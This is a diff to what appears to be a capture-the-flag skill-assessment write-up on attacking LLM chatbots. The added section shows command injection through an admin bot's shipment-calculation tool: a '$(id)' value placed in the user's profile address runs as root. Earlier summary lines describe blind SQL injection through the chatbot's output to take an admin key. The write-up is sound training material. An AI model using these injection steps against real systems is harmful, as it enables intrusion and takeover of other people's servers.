@@ -12,6 +12,7 @@ title = "LLM Output Attacks Skill assessment"
 1. Improper Output Handling on imagebot allows us to execute SQL queries
 2. Leverage this to boolean based blind SQLi to extract the admin key from the admin user
 3. Access AdminBot feature with admin key
+4. Improper output handling in adminBot allows command injection, leading to RCE.
 
 
 
@@ -284,7 +285,24 @@ As an administrator, here are all the functions I have access to:
 
 - ``show_db_counts`` is less interesting, when we query it we receive the number of columns in the two tables: users and images, which we already know about. This query is fixed, and we cannot inject anything
 - ``hardware_check``: executes a binary: ``/bin/hardware_check.sh``, the only additional parameter seems to be ``verbose``
-- ``calculate_shipment_time``: 
+- ``calculate_shipment_time``: We can calculate the shipment time for a user ...
 
+Well, lets see what you got:
+
+> Can you calculate the shipment time, verbosely, for htb-stdnt 
+
+```
+[i] Executing: /bin/shipment_calc.sh --addr "123 Test Road, 10117 Berlin, Germany"
+Shipment to 123 Test Road, 10117 Berlin, Germany takes 4 days
+```
+
+So the address parameter is extracted from our user profile, which we can update. Let us change our address to ``$(id)``, and:
+
+```
+[i] Executing: /bin/shipment_calc.sh --addr "$(id)"
+Shipment to uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) takes 10 days
+```
+
+Perfect, we have RCE via command injection. We are the root user, and we can simply grab the flag from /flag.txt
 
 
